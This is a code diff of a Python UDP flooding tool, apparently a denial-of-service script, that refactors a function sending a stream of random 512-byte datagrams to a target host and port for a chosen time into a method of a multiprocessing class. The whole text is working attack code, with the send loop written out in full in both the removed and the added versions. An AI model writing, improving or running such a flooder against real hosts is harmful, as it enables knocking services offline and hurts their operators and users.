@@ -20,30 +20,30 @@ class port_Flooder(multiprocessing.process.BaseProcess):
         #self.tmphost = host #Host (Constant)
         #self.tmpport = port #Port (Dynamic)
         #self.tmpflood_time = time #Flood Time (Constant)
-        flood_port(self.tmphost, self.tmpport, self.tmpflood_time)
+        self.flood_port(self.tmphost, self.tmpport, self.tmpflood_time)
 
-def flood_port(*args):
-    tmphost = args[0]
-    tmpport = args[1]
-    tmpflood_time = args[2]
-    print("Received Arguments : "+str(args))
-    print("Flooding Port "+str(tmpport)+" Using PID "+str(os.getpid()))
-    current_count = 0
-    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    random_data = bytes(random._urandom(512))
-    print("Start Time (Current) : "+str(time.time()))
-    stop_time = int(time.time()) + int(tmpflood_time)
-    print("Stop Time (Current + -u Input) : "+str(stop_time))
-    msg = 0
-    while True:
-        if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
-            break
-        else:
-            pass
-        print("Datagram "+str(msg)+" Sent to "+tmphost+" on Port "+str(tmpport))
-        msg = msg + 1
-        temp_socket.sendto(random_data, (tmphost, int(tmpport)))
-        current_count = current_count + 1
+    def flood_port(self, host, port, time2):
+        tmphost = host
+        tmpport = port
+        tmpflood_time = time2
+        print("Received Arguments : Host : "+tmphost+", Port : "+str(tmpport)+", Flood-Time : "+str(tmpflood_time))
+        print("Flooding Port "+str(tmpport)+" Using PID "+str(os.getpid()))
+        current_count = 0
+        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        random_data = bytes(random._urandom(512))
+        print("Start Time (Current) : "+str((time.time())))
+        stop_time = int(time.time()) + int(tmpflood_time)
+        print("Stop Time (Current + -u Input) : "+str(stop_time))
+        msg = 0
+        while True:
+            if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
+                break
+            else:
+                pass
+            print("Datagram "+str(msg)+" Sent to "+tmphost+" on Port "+str(tmpport))
+            msg = msg + 1
+            temp_socket.sendto(random_data, (tmphost, int(tmpport)))
+            current_count = current_count + 1
 
 
 
